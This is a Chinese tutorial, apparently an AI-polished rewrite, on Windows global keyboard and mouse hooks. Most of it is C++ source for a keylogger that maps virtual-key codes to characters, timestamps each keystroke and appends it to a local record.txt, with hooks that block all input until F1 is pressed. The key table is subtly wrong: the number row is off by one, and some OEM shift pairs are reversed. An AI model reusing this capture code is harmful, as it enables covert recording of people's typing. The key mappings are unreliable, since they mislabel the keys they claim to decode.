以下是优化后的文本，使其更加清晰、连贯和专业：

---

### **函数 `voidHookCode` 说明**

```cpp
/**
 * @brief 根据键盘状态生成按键字符。
 *
 * @param code 键盘扫描码。
 * @param caps 是否按下大写锁定键（TRUE 表示按下）。
 * @param shift 是否按住 Shift 键（TRUE 表示按住）。
 * @param Out 输出的按键字符，存储在指针指向的内存中。
 * @return 无返回值。
 */
void HookCode(DWORD code, BOOL caps, BOOL shift, char* Out) {
    std::string key;
    switch (code) {
        // 字符键
        case 0x41: key = (caps ? (shift ? "a" : "A") : (shift ? "A" : "a")); break;
        case 0x42: key = (caps ? (shift ? "b" : "B") : (shift ? "B" : "b")); break;
        case 0x43: key = (caps ? (shift ? "c" : "C") : (shift ? "C" : "c")); break;
        case 0x44: key = (caps ? (shift ? "d" : "D") : (shift ? "D" : "d")); break;
        case 0x45: key = (caps ? (shift ? "e" : "E") : (shift ? "E" : "e")); break;
        case 0x46: key = (caps ? (shift ? "f" : "F") : (shift ? "F" : "f")); break;
        case 0x47: key = (caps ? (shift ? "g" : "G") : (shift ? "G" : "g")); break;
        case 0x48: key = (caps ? (shift ? "h" : "H") : (shift ? "H" : "h")); break;
        case 0x49: key = (caps ? (shift ? "i" : "I") : (shift ? "I" : "i")); break;
        case 0x4A: key = (caps ? (shift ? "j" : "J") : (shift ? "J" : "j")); break;
        case 0x4B: key = (caps ? (shift ? "k" : "K") : (shift ? "K" : "k")); break;
        case 0x4C: key = (caps ? (shift ? "l" : "L") : (shift ? "L" : "l")); break;
        case 0x4D: key = (caps ? (shift ? "m" : "M") : (shift ? "M" : "m")); break;
        case 0x4E: key = (caps ? (shift ? "n" : "N") : (shift ? "N" : "n")); break;
        case 0x4F: key = (caps ? (shift ? "o" : "O") : (shift ? "O" : "o")); break;
        case 0x50: key = (caps ? (shift ? "p" : "P") : (shift ? "P" : "p")); break;
        case 0x51: key = (caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q")); break;
        case 0x52: key = (caps ? (shift ? "r" : "R") : (shift ? "R" : "r")); break;
        case 0x53: key = (caps ? (shift ? "s" : "S") : (shift ? "S" : "s")); break;
        case 0x54: key = (caps ? (shift ? "t" : "T") : (shift ? "T" : "t")); break;
        case 0x55: key = (caps ? (shift ? "u" : "U") : (shift ? "U" : "u")); break;
        case 0x56: key = (caps ? (shift ? "v" : "V") : (shift ? "V" : "v")); break;
        case 0x57: key = (caps ? (shift ? "w" : "W") : (shift ? "W" : "w")); break;
        case 0x58: key = (caps ? (shift ? "x" : "X") : (shift ? "X" : "x")); break;
        case 0x59: key = (caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y")); break;
        case 0x5A: key = (caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z")); break;

        // 特殊键
        case VK_SLEEP: key = "[SLEEP]"; break;
        case VK_NUMPAD0: key = "0"; break;
        case VK_NUMPAD1: key = "1"; break;
        case VK_NUMPAD2: key = "2"; break;
        case VK_NUMPAD3: key = "3"; break;
        case VK_NUMPAD4: key = "4"; break;
        case VK_NUMPAD5: key = "5"; break;
        case VK_NUMPAD6: key = "6"; break;
        case VK_NUMPAD7: key = "7"; break;
        case VK_NUMPAD8: key = "8"; break;
        case VK_NUMPAD9: key = "9"; break;
        case VK_MULTIPLY: key = "*"; break;
        case VK_ADD: key = "+"; break;
        case VK_SEPARATOR: key = "-"; break;
        case VK_SUBTRACT: key = "-"; break;
        case VK_DECIMAL: key = "."; break;
        case VK_DIVIDE: key = "/"; break;

        // 功能键
        case VK_F1: key = "[F1]"; break;
        case VK_F2: key = "[F2]"; break;
        case VK_F3: key = "[F3]"; break;
        case VK_F4: key = "[F4]"; break;
        case VK_F5: key = "[F5]"; break;
        case VK_F6: key = "[F6]"; break;
        case VK_F7: key = "[F7]"; break;
        case VK_F8: key = "[F8]"; break;
        case VK_F9: key = "[F9]"; break;
        case VK_F10: key = "[F10]"; break;
        case VK_F11: key = "[F11]"; break;
        case VK_F12: key = "[F12]"; break;
        case VK_F13: key = "[F13]"; break;
        case VK_F14: key = "[F14]"; break;
        case VK_F15: key = "[F15]"; break;
        case VK_F16: key = "[F16]"; break;
        case VK_F17: key = "[F17]"; break;
        case VK_F18: key = "[F18]"; break;
        case VK_F19: key = "[F19]"; break;
        case VK_F20: key = "[F20]"; break;
        case VK_F21: key = "[F21]"; break;
        case VK_F22: key = "[F22]"; break;
        case VK_F23: key = "[F23]"; break;
        case VK_F24: key = "[F24]"; break;

        // 其他键
        case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
        case VK_SCROLL: key = "[SCROLL-LOCK]"; break;
        case VK_BACK: key = "[BACK]"; break;
        case VK_TAB: key = "[TAB]"; break;
        case VK_CLEAR: key = "[CLEAR]"; break;
        case VK_RETURN: key = "[ENTER]"; break;
        case VK_SHIFT: key = "[SHIFT]"; break;
        case VK_CONTROL: key = "[CTRL]"; break;
        case VK_MENU: key = "[ALT]"; break;
        case VK_PAUSE: key = "[PAUSE]"; break;
        case VK_CAPITAL: key = "[CAP-LOCK]"; break;
        case VK_ESCAPE: key = "[ESC]"; break;
        case VK_SPACE: key = "[SPACE]"; break;
        case VK_PRIOR: key = "[PAGEUP]"; break;
        case VK_NEXT: key = "[PAGEDOWN]"; break;
        case VK_END: key = "[END]"; break;
        case VK_HOME: key = "[HOME]"; break;
        case VK_LEFT: key = "[LEFT]"; break;
        case VK_UP: key = "[UP]"; break;
        case VK_RIGHT: key = "[RIGHT]"; break;
        case VK_DOWN: key = "[DOWN]"; break;
        case VK_SELECT: key = "[SELECT]"; break;
        case VK_PRINT: key = "[PRINT]"; break;
        case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
        case VK_INSERT: key = "[INS]"; break;
        case VK_DELETE: key = "[DEL]"; break;
        case VK_HELP: key = "[HELP]"; break;

        // 数字键与 Shift 组合
        case 0x30: key = (shift ? "!" : "1"); break;
        case 0x31: key = (shift ? "@" : "2"); break;
        case 0x32: key = (shift ? "#" : "3"); break;
        case 0x33: key = (shift ? "$" : "4"); break;
        case 0x34: key = (shift ? "%" : "5"); break;
        case 0x35: key = (shift ? "^" : "6"); break;
        case 0x36: key = (shift ? "&" : "7"); break;
        case 0x37: key = (shift ? "*" : "8"); break;
        case 0x38: key = (shift ? "(" : "9"); break;
        case 0x39: key = (shift ? ")" : "0"); break;

        // Windows 键
        case VK_LWIN: key = "[WIN]"; break;
        case VK_RWIN: key = "[WIN]"; break;
        case VK_LSHIFT: key = "[SHIFT]"; break;
        case VK_RSHIFT: key = "[SHIFT]"; break;
        case VK_LCONTROL: key = "[CTRL]"; break;
        case VK_RCONTROL: key = "[CTRL]"; break;

        // OEM 键与 Shift 组合
        case VK_OEM_1: key = (shift ? ":" : ";"); break;
        case VK_OEM_PLUS: key = (shift ? "+" : "="); break;
        case VK_OEM_COMMA: key = (shift ? "<" : ","); break;
        case VK_OEM_2: key = (shift ? "?" : "/"); break;
        case VK_OEM_3: key = (shift ? "~" : "`"); break;
        case VK_OEM_4: key = (shift ? "{" : "["); break;
        case VK_OEM_5: key = (shift ? "\\" : "|"); break;
        case VK_OEM_6: key = (shift ? "}" : "]"); break;
        case VK_OEM_7: key = (shift ? "\"" : "'"); break;

        // 功能键
        case VK_PLAY: key = "[PLAY]"; break;
        case VK_ZOOM: key = "[ZOOM]"; break;
        case VK_OEM_CLEAR: key = "[CLEAR]"; break;
        case VK_CANCEL: key = "[CTRL-C]"; break;

        default: key = "[UNK-KEY]";
    }

    key.copy(Out + strlen(Out), key.length(), 0);
}
```

### **记录按键时间和按键状态**

```cpp
char WM_Key[40] = {0};
char Date_Key[200] = {0};
SYSTEMTIME time;
GetLocalTime(&time);
sprintf(Date_Key, "%d-%02d-%02d %02d:%02d:%02d\t", 
        time.wYear, time.wMonth, time.wDay, 
        time.wHour, time.wMinute, time.wSecond);

int len = strlen(Date_Key);
if (wParam == WM_KEYDOWN) {
    sprintf(WM_Key, "WM_KEYDOWN_");
} else {
    sprintf(WM_Key, "WM_KEYUP_");
}

HookCode(p->vkCode, caps, bShift, WM_Key);
strcpy(Date_Key + strlen(Date_Key), WM_Key);
len = strlen(Date_Key);
Date_Key[len] = '\n';
Date_Key[len + 1] = 0;
```

### **将按键信息记录到文件里**

```cpp
/**
 * @brief 将按键信息写入文件。
 *
 * @param Date_Key 要写入的字符串。
 * @param len 字符串长度。
 * @return 写入是否成功。
 */
BOOL WriteMessageToFile(char* Date_Key, int len) {
    HANDLE hFile = CreateFileA(
        "./record.txt",
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        MessageBox(NULL, L"open file failed!", L"tip", NULL);
        return FALSE;
    }

    SetFilePointer(hFile, 0, NULL, FILE_END);
    DWORD dwWrited = 0;
    WriteFile(hFile, Date_Key, len, &dwWrited, NULL);
    CloseHandle(hFile);
    return TRUE;
}

if (!WriteMessageToFile(Date_Key, len + 1)) {
    exit(0);
}
```

### **拦截所有按键消息，按 F1 键卸载钩子解除拦截**

如果安装的钩子要拦截消息，那么钩子的过程函数返回值必须是一个非零的值。因此，我们令钩子的过程函数返回 `1`。然后设置一个按键表示手动卸载钩子，解除拦截。

```cpp
// 按键 F1 即卸载钩子
char exitKey[20] = "WM_KEYUP_[F1]";
if (!memcmp(exitKey, WM_Key, strlen(exitKey))) {
    UnhookWindowsHookEx(hKeyboardHook); // 卸载键盘钩子
    UnhookWindowsHookEx(hMouseHook); // 卸载鼠标钩子
    ::MessageBox(NULL, L"KeyBoardHook、MouseHook unmounted！", L"Tip", NULL);
    exit(0);
}
```

以上就是键盘钩子过程函数的设定。

## **鼠标钩子过程函数**

安装鼠标钩子：

```cpp
hMouseHook = SetWindowsHookExA(WH_MOUSE_LL, MouseCursorProc, GetModuleHandle(NULL), NULL);
```

当第一个参数钩子类型设置为 `WH_MOUSE_LL` 且第四个参数为 `NULL` 时，代表设置的钩子为全局鼠标钩子。此时被拦截的消息表示为：鼠标上按键的按下和放开。鼠标上的按键可以有很多，但这个钩子仅简单识别鼠标左键、右键的按下和放开。

### **鼠标钩子过程函数的参数**

此时鼠标钩子对应的窗口过程函数为 `LowLevelMouseProc` 回调函数（参考微软官方文档）。

```cpp
LRESULT CALLBACK MouseCursorProc(int nCode, WPARAM wParam, LPARAM lParam) {
    return 1; // 代表拦截消息
}
```

第一个参数 `nCode` 一般记录被此钩子拦截的消息的次数。重点在于后面两个参数 `wParam` 和 `LPARAM`。